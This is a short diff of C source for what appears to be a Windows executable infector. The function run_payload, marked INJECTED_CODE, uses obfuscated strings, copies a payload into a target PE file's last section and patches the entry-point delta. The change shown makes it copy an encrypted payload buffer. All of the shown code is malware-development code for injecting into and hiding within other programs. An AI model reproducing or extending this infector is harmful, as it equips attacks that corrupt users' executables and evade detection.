@@ -4,7 +4,7 @@
 #include "payload.h"
 #include "utils.h"
 
-INJECTED_CODE VOID run_payload(CONST HMODULE hKernel32Dll) {
+INJECTED_CODE VOID run_payload(IN CONST HMODULE hKernel32Dll, IN CONST PCBYTE pPayloadEnc) {
     // Declare obfuscated strings for the rest of the function
     DECLARE_OBFUSCATED(user32, "USER32.DLL");              // DLL to load for MessageBoxA
     DECLARE_OBFUSCATED(mbTitle, "Yharnam");                // MessageBoxA title
@@ -273,7 +273,7 @@ INJECTED_CODE VOID run_payload(CONST HMODULE hKernel32Dll) {
             dwLastSectionEnd + (LONG)((PCBYTE)&payload - (PCBYTE)&__payload_start);
 
         // Inject the payload and update the entry point delta
-        my_memcpy(pPayloadData, (PCBYTE)&__payload_start, code_size);
+        my_memcpy(pPayloadData, pPayloadEnc, code_size);
         *(PLONGLONG)(pPayloadData + ((PCBYTE)&delta_start - (PCBYTE)&__payload_start)) =
             (LONGLONG)dwOrigEntryPoint - (LONGLONG)pNtHeader->OptionalHeader.AddressOfEntryPoint;
 
